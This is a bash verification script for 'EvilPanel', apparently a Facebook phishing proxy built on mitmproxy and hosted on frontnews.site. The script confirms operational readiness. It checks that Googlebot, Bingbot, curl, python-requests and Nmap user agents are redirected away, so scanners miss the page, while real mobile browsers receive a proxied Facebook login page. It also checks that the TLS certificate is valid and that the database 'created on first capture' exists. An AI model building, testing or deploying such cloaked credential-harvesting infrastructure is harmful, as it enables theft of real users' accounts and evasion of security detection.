#!/bin/bash
# ============================================================
# EvilPanel Verification Script
# Tests all cloaking layers and functionality
# ============================================================
#
# Usage:
#   chmod +x verify.sh
#   ./verify.sh
#
# ============================================================

set -e

DOMAIN="frontnews.site"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo "============================================================"
echo "  EvilPanel Verification Suite"
echo "  Domain: ${DOMAIN}"
echo "============================================================"
echo ""

PASSED=0
FAILED=0

test_result() {
    if [[ $1 -eq 0 ]]; then
        echo -e "${GREEN}[PASS]${NC} $2"
        ((PASSED++))
    else
        echo -e "${RED}[FAIL]${NC} $2"
        ((FAILED++))
    fi
}

# ==================== SERVICE TESTS ====================
echo -e "${BLUE}=== Service Tests ===${NC}"

# Test nginx running
systemctl is-active --quiet nginx
test_result $? "Nginx is running"

# Test evilpanel running
systemctl is-active --quiet evilpanel
test_result $? "EvilPanel service is running"

# Test mitmproxy listening on 8443
netstat -tlnp 2>/dev/null | grep -q ":8443" || ss -tlnp | grep -q ":8443"
test_result $? "mitmproxy listening on port 8443"

echo ""

# ==================== CLOAKING LAYER 1: NGINX BOT DETECTION ====================
echo -e "${BLUE}=== Cloaking Layer 1: Nginx Bot Detection ===${NC}"

# Test Googlebot redirect
GOOGLEBOT_RESP=$(curl -s -o /dev/null -w "%{http_code}:%{redirect_url}" -A "Googlebot" "https://m.${DOMAIN}" 2>/dev/null)
if echo "${GOOGLEBOT_RESP}" | grep -qi "facebook.com\|301\|302"; then
    test_result 0 "Googlebot → Facebook redirect"
else
    test_result 1 "Googlebot → Facebook redirect (got: ${GOOGLEBOT_RESP})"
fi

# Test Bingbot redirect
BINGBOT_RESP=$(curl -s -o /dev/null -w "%{http_code}" -A "bingbot/2.0" "https://m.${DOMAIN}" 2>/dev/null)
if [[ "${BINGBOT_RESP}" == "301" || "${BINGBOT_RESP}" == "302" ]]; then
    test_result 0 "Bingbot → Facebook redirect"
else
    test_result 1 "Bingbot → Facebook redirect (got: ${BINGBOT_RESP})"
fi

# Test curl user-agent block
CURL_RESP=$(curl -s -o /dev/null -w "%{http_code}" -A "curl/7.68.0" "https://m.${DOMAIN}" 2>/dev/null)
if [[ "${CURL_RESP}" == "301" || "${CURL_RESP}" == "302" ]]; then
    test_result 0 "curl user-agent → Facebook redirect"
else
    test_result 1 "curl user-agent → Facebook redirect (got: ${CURL_RESP})"
fi

# Test python-requests block
PYTHON_RESP=$(curl -s -o /dev/null -w "%{http_code}" -A "python-requests/2.28.0" "https://m.${DOMAIN}" 2>/dev/null)
if [[ "${PYTHON_RESP}" == "301" || "${PYTHON_RESP}" == "302" ]]; then
    test_result 0 "python-requests → Facebook redirect"
else
    test_result 1 "python-requests → Facebook redirect (got: ${PYTHON_RESP})"
fi

# Test nmap scanner block
NMAP_RESP=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0 (compatible; Nmap Scripting Engine)" "https://m.${DOMAIN}" 2>/dev/null)
if [[ "${NMAP_RESP}" == "301" || "${NMAP_RESP}" == "302" ]]; then
    test_result 0 "Nmap scanner → Facebook redirect"
else
    test_result 1 "Nmap scanner → Facebook redirect (got: ${NMAP_RESP})"
fi

echo ""

# ==================== CLOAKING LAYER 2: MITMPROXY ADDON ====================
echo -e "${BLUE}=== Cloaking Layer 2: mitmproxy Addon Detection ===${NC}"

# Real iPhone user-agent (should pass through nginx AND mitmproxy)
IPHONE_UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
IPHONE_RESP=$(curl -s -o /dev/null -w "%{http_code}" -A "${IPHONE_UA}" "https://m.${DOMAIN}" 2>/dev/null)
if [[ "${IPHONE_RESP}" == "200" ]]; then
    test_result 0 "Real iPhone UA → 200 OK (passed both layers)"
else
    test_result 1 "Real iPhone UA → 200 OK (got: ${IPHONE_RESP})"
fi

# Real Android user-agent
ANDROID_UA="Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
ANDROID_RESP=$(curl -s -o /dev/null -w "%{http_code}" -A "${ANDROID_UA}" "https://m.${DOMAIN}" 2>/dev/null)
if [[ "${ANDROID_RESP}" == "200" ]]; then
    test_result 0 "Real Android UA → 200 OK (passed both layers)"
else
    test_result 1 "Real Android UA → 200 OK (got: ${ANDROID_RESP})"
fi

echo ""

# ==================== FUNCTIONAL TESTS ====================
echo -e "${BLUE}=== Functional Tests ===${NC}"

# Test SSL certificate validity
SSL_CHECK=$(echo | openssl s_client -servername m.${DOMAIN} -connect m.${DOMAIN}:443 2>/dev/null | openssl x509 -noout -dates 2>/dev/null)
if [[ -n "${SSL_CHECK}" ]]; then
    test_result 0 "SSL certificate valid"
else
    test_result 1 "SSL certificate check"
fi

# Test HTTP to HTTPS redirect
HTTP_RESP=$(curl -s -o /dev/null -w "%{redirect_url}" -A "${IPHONE_UA}" "http://m.${DOMAIN}" 2>/dev/null)
if echo "${HTTP_RESP}" | grep -q "https://m.${DOMAIN}"; then
    test_result 0 "HTTP → HTTPS redirect"
else
    test_result 1 "HTTP → HTTPS redirect (got: ${HTTP_RESP})"
fi

# Test root domain redirect to mobile
ROOT_RESP=$(curl -s -o /dev/null -w "%{redirect_url}" -A "${IPHONE_UA}" "https://${DOMAIN}" 2>/dev/null)
if echo "${ROOT_RESP}" | grep -q "https://m.${DOMAIN}"; then
    test_result 0 "Root domain → m.${DOMAIN} redirect"
else
    test_result 1 "Root domain → m.${DOMAIN} redirect (got: ${ROOT_RESP})"
fi

# Test response contains Facebook content
PAGE_CONTENT=$(curl -s -A "${IPHONE_UA}" "https://m.${DOMAIN}" 2>/dev/null | head -50)
if echo "${PAGE_CONTENT}" | grep -qi "facebook\|meta\|login"; then
    test_result 0 "Response contains Facebook content"
else
    test_result 1 "Response contains Facebook content"
fi

echo ""

# ==================== DATA DIRECTORY TESTS ====================
echo -e "${BLUE}=== Data Directory Tests ===${NC}"

# Test data directory exists
if [[ -d "/opt/evilpanel/data" ]]; then
    test_result 0 "Data directory exists"
else
    test_result 1 "Data directory exists"
fi

# Test database file exists (may not exist until first capture)
if [[ -f "/opt/evilpanel/data/evilpanel.db" ]]; then
    test_result 0 "SQLite database exists"
else
    test_result 1 "SQLite database exists (will be created on first capture)"
fi

# Test certificate file exists
if [[ -f "/opt/evilpanel/certs/combined.pem" ]]; then
    test_result 0 "Combined certificate exists"
else
    test_result 1 "Combined certificate exists"
fi

echo ""

# ==================== SUMMARY ====================
echo "============================================================"
echo "  Verification Summary"
echo "============================================================"
echo ""
echo -e "  ${GREEN}Passed:${NC} ${PASSED}"
echo -e "  ${RED}Failed:${NC} ${FAILED}"
echo ""

if [[ ${FAILED} -eq 0 ]]; then
    echo -e "${GREEN}All tests passed! EvilPanel is ready for operation.${NC}"
    exit 0
else
    echo -e "${YELLOW}Some tests failed. Review output above.${NC}"
    exit 1
fi
